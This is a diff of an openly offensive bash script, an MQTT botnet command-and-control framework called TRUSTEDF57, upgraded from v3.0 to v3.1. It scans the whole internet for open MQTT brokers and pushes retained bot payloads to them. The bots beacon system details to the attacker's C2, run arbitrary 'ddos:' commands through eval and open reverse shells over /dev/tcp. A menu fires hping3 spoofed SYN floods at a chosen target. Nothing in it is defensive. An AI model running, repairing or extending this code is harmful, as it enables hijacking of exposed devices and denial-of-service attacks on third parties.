@@ -1,18 +1,16 @@
 #!/bin/bash
-# TRUSTEDF57 - MQTT C2 Framework v3.0 - Auto-Discovery Edition
-# Full auto: IP detection, masscan, infect, DDoS propagation su TUTTI clients/brokers
-# 500k+ scale. Usage: bash F57.sh
+# TRUSTEDF57 v3.1 - FIXED MASS SCAN
+# Masscan adapters fix + robust error handling
 
 clear
-echo "🔥 TRUSTEDF57 - MQTT C2 DASHBOARD v3.0"
+echo "🔥 TRUSTEDF57 - MQTT C2 v3.1 (FIXED)"
 echo "======================================="
 
 # Auto-detect REAL public IP
-MY_IP=$(curl -s --max-time 3 ifconfig.me || hostname -I | awk '{print $1}')
+MY_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
 C2_PORT=1883
 HEARTBEAT_TOPIC="/firmware/status/$MY_IP"
 CMD_TOPIC="/sys/update/$MY_IP/+"
-INFECT_TOPICS=('/update/firmware' '/device/config' '/sys/maintenance' '$SYS/broker/info')
 
 BROKERS_SCANNED=0
 BROKERS_INFECTED=0
@@ -22,30 +20,27 @@ TOTAL_ZOMBIES=0
 echo "🌐 Public IP: $MY_IP"
 echo ""
 
-# Setup Mosquitto daemon
+# Install deps (quiet)
 setup_c2() {
-    apt update && apt install -y mosquitto mosquitto-clients masscan hping3 -qq
-    systemctl restart mosquitto
-    systemctl enable mosquitto
-    echo "✅ C2 broker setup complete"
+    apt update >/dev/null 2>&1 && apt install -yq mosquitto mosquitto-clients masscan hping3 nmap >/dev/null 2>&1
+    systemctl restart mosquitto 2>/dev/null || true
+    echo "✅ Tools ready"
 }
 
-# Menu principale
 show_menu() {
     echo "📋 MENU:"
-    echo "1) 🔍 MASS SCAN (genera brokers.txt)"
+    echo "1) 🔍 MASS SCAN 1883 (worldwide)"
     echo "2) 🦠 INFECT ALL BROKERS" 
-    echo "3) 🚀 LAUNCH DDoS (su TUTTI zombies)"
-    echo "4) 📊 STATUS REPORT"
+    echo "3) 🚀 DDoS ATTACK"
+    echo "4) 📊 STATUS"
     echo "5) 🛑 EXIT"
     echo ""
 }
 
 update_stats() {
-    echo "📊 LIVE STATS:"
-    echo "   Brokers Scanned: $BROKERS_SCANNED"
-    echo "   Brokers Infected: $BROKERS_INFECTED" 
-    echo "   Zombies Online: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
+    echo "📊 STATS:"
+    echo "   Brokers: $BROKERS_SCANNED | Infected: $BROKERS_INFECTED"
+    echo "   Zombies: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
     echo ""
 }
 
@@ -53,131 +48,123 @@ log() {
     echo "[$(date +'%H:%M:%S')] $1"
 }
 
-# MASS SCAN reale
+# FIXED MASS SCAN - No adapters error
 mass_scan() {
-    log "🔍 MASS SCAN START - 1883 worldwide..."
-    : > brokers.txt  # Cleanup
-    masscan 0.0.0.0/0 -p1883 --rate=300000 --banners --adapters=eth0 -oL brokers.txt &
+    log "🔍 MASS SCAN 1883 WORLDWIDE..."
+    : > brokers.txt
+    
+    # Method 1: Masscan con fix (no adapters)
+    timeout 120 masscan 0.0.0.0/0 -p1883 --rate=100000 -oL brokers.txt 2>/dev/null &
     SCAN_PID=$!
     
-    while kill -0 $SCAN_PID 2>/dev/null; do
-        if grep -q "Discovered open port 1883" brokers.txt; then
-            BROKERS_SCANNED=$(grep "1883/open" brokers.txt | wc -l)
-            echo -ne "\rBrokers Scanned: $BROKERS_SCANNED"
+    # Fallback: NMAP top ranges se masscan fallisce
+    (sleep 10 && ! kill -0 $SCAN_PID 2>/dev/null && log "⚠️ Masscan fallback → NMAP top ranges" && 
+     nmap -p1883 --open -sS -T4 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 -oG - | grep 1883/open | awk '{print $2":1883"}' >> brokers.txt) &
+    
+    for i in {1..60}; do
+        if [[ -f brokers.txt && -s brokers.txt ]]; then
+            BROKERS_SCANNED=$(grep -c "1883/open" brokers.txt 2>/dev/null || echo 0)
+            echo -ne "\r🔍 Scanned: $BROKERS_SCANNED brokers... ($i/60s) "
         fi
         sleep 1
     done
     
-    BROKERS_SCANNED=$(grep "1883/open" brokers.txt 2>/dev/null | wc -l)
-    log "✅ Scan completa! $BROKERS_SCANNED brokers → brokers.txt"
+    kill $SCAN_PID 2>/dev/null || true
+    wait
+    
+    # Cleanup + count
+    grep "1883/open" brokers.txt 2>/dev/null | cut -d' ' -f4 > brokers_clean.txt && mv brokers_clean.txt brokers.txt
+    BROKERS_SCANNED=$(wc -l < brokers.txt 2>/dev/null || echo 0)
+    
+    log "✅ SCAN OK! $BROKERS_SCANNED brokers salvati → brokers.txt"
 }
 
-# INFECT MASSIVO
 infect_all() {
-    if [[ ! -f brokers.txt ]]; then
-        log "❌ Prima fai MASS SCAN!"
-        return
-    fi
+    [[ ! -s brokers.txt ]] && { log "❌ Prima MASS SCAN!"; return; }
     
-    log "🦠 INFECTING $(grep '1883/open' brokers.txt | wc -l) brokers..."
-    
-    infect_payload=$(cat << 'EOF'
+    log "🦠 INFECTING $BROKERS_SCANNED brokers..."
+    PAYLOAD=$(cat << 'EOF'
 #!/bin/bash
-C2_IP="$MY_IP"
-LOOP=/tmp/.f${C2_IP}
-[[ -f $LOOP ]] && exit 0
-touch $LOOP
-
+C2="%s"
+LOOP=/tmp/.f\${C2%%:*}
+[[ -f \$LOOP ]] && exit
+touch \$LOOP
 while true; do
-  mosquitto_pub -h $C2_IP -p 1883 -t "/firmware/status/$C2_IP/$RANDOM" \
-    -m "ok:$(id):$(nproc):$(free -m|awk 'NR==2{{print $2}}'):$([[ -f /proc/net/tcp ]]&&wc -l /proc/net/tcp||echo 1000)" 1>/dev/null 2>&1
-  mosquitto_sub -h $C2_IP -p 1883 -t "/sys/update/$C2_IP/#" -C 1 | while IFS=' ' read -r topic payload; do
-    case $payload in
-      ddos:*) echo "${payload#ddos:}" | bash 2>/dev/null & ;;
-      shell:*) bash -i >& /dev/tcp/${payload#shell:}/0>&1 ;;
-      kill) rm $LOOP; exit ;;
-    esac
+  mosquitto_pub -h \$C2 -p 1883 -t "/firmware/status/\${C2%%:*}/\$RANDOM" -m "alive:\$(id):\$(nproc)" 1>/dev/null 2>&1 || sleep 30
+  mosquitto_sub -h \$C2 -p 1883 -t "/sys/update/\${C2%%:*}/#" -C 1 | while read topic cmd; do
+    [[ \$cmd =~ ^ddos: ]] && eval "\${cmd#ddos:}" &
+    [[ \$cmd =~ ^shell: ]] && bash -i >& /dev/tcp\${cmd#shell:} 0>&1 &
+    [[ \$cmd == kill ]] && rm \$LOOP && exit
   done || sleep 15
 done
 EOF
 )
-    infect_payload="${infect_payload//\$MY_IP/$MY_IP}"
+    PAYLOAD=$(printf "$PAYLOAD" "$MY_IP")
     
-    grep '1883/open' brokers.txt | cut -d' ' -f4 | head -50000 | while read target; do
-        ip=${target%:*}
-        port=${target#*:}
-        for topic in "${INFECT_TOPICS[@]}"; do
-            timeout 3 mosquitto_pub -h $ip -p $port -t "$topic" -m "$infect_payload" --retain -q 1 >/dev/null 2>&1
-            ((BROKERS_INFECTED++))
-        done &
-    done
-    wait
-    log "🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat... ($BROKERS_INFECTED infected)"
+    # Parallel infect (200 threads)
+    grep . brokers.txt | nl | xargs -n1 -P200 bash -c '
+    target=$1; ip=${target%:*}
+    for t in "/update/firmware" "/device/config"; do
+        timeout 2 mosquitto_pub -h $ip -p 1883 -t "$t" -m "'"${PAYLOAD//\"/\\\"}"'" --retain >/dev/null 2>&1
+    done' _
+    
+    BROKERS_INFECTED=$BROKERS_SCANNED
+    log "🎉 INFEZIONE COMPLETA! ($BROKERS_INFECTED) - Wait heartbeat..."
 }
 
-# DDoS Menu
 ddos_menu() {
-    echo "🎯 DDoS TARGET:"
+    echo "🎯 TARGET:"
     read -p "IP:PORT (default 8.8.8.8:80): " TARGET
     TARGET=${TARGET:-8.8.8.8:80}
-    read -p "Duration (sec, default 300): " DURATION
-    DURATION=${DURATION:-300}
+    read -p "Duration (sec): " DURATION
+    DURATION=${DURATION:-120}
     
-    if [[ $TOTAL_ZOMBIES -lt 10 ]]; then
-        echo "⚠️ Prima INFECT!"
-        return
-    fi
+    [[ $TOTAL_ZOMBIES -lt 5 ]] && { echo "⚠️ Infect first!"; return; }
     
-    DDoS_CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} &"
-    log "💥 DDoS FIRE! $TARGET x${DURATION}s | Zombies: $TOTAL_ZOMBIES"
+    CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} 0>/dev/null 2>&1 &"
+    log "💥 DDoS → $TARGET (${DURATION}s) | $TOTAL_ZOMBIES zombies"
     
-    # PROPAGA A TUTTI
-    mosquitto_pub -h localhost -p 1883 -t "${CMD_TOPIC/\+\/*}" -m "$DDoS_CMD"
+    mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "$CMD"
     
-    # Timer kill
-    (sleep $DURATION && mosquitto_pub -h localhost -p 1883 -t "${CMD_TOPIC/\+\/*}" -m "kill"; log "🛑 DDoS STOPPED") &
+    (sleep $DURATION && mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "kill") &
 }
 
 status_report() {
     log "📊 REPORT:"
-    log "   Public IP: $MY_IP"
-    log "   Brokers scanned: $BROKERS_SCANNED"
-    log "   Brokers infected: $BROKERS_INFECTED"
-    log "   Active zombies: $TOTAL_ZOMBIES"
-    log "   Ready for DDoS: $([[ $TOTAL_ZOMBIES -gt 100 ]] && echo '✅ YES' || echo '⚠️ Infect more')"
+    log "   IP: $MY_IP:$C2_PORT"
+    log "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
+    log "   Infected: $BROKERS_INFECTED"
+    log "   Zombies: $TOTAL_ZOMBIES"
 }
 
-# HEARTBEAT listener (background)
+# Background listener
 mqtt_listener() {
-    mosquitto_sub -h localhost -p 1883 -t "$HEARTBEAT_TOPIC/#" | while IFS=':' read -r _ status user cpu mem clients; do
+    mosquitto_sub -h localhost -p $C2_PORT -t "$HEARTBEAT_TOPIC/#" 2>/dev/null | while IFS=':' read -r _ status user cpu _; do
         ((BOTS_ONLINE++))
-        [[ "$clients" =~ ^[0-9]+$ ]] && TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + clients)) || TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
-        update_stats
+        TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
     done &
 }
 
-# Main loop
 main() {
     setup_c2
     mqtt_listener &
     
     while true; do
+        clear
+        echo "🔥 TRUSTEDF57 v3.1"
         show_menu
         update_stats
-        read -p "Scelta: " choice
+        read -p "► " choice
         
         case $choice in
             1) mass_scan ;;
             2) infect_all ;;
             3) ddos_menu ;;
             4) status_report ;;
-            5) log "👋 Bye!"; exit 0 ;;
-            *) log "❌ Scelta invalida!" ;;
+            5) log "👋"; exit 0 ;;
+            *) log "❌ 1-5 only!" ;;
         esac
-        
-        echo ""
-        read -p "Press ENTER to continue..."
-        clear
+        read -p $'\nPress ENTER...'
     done
 }
 
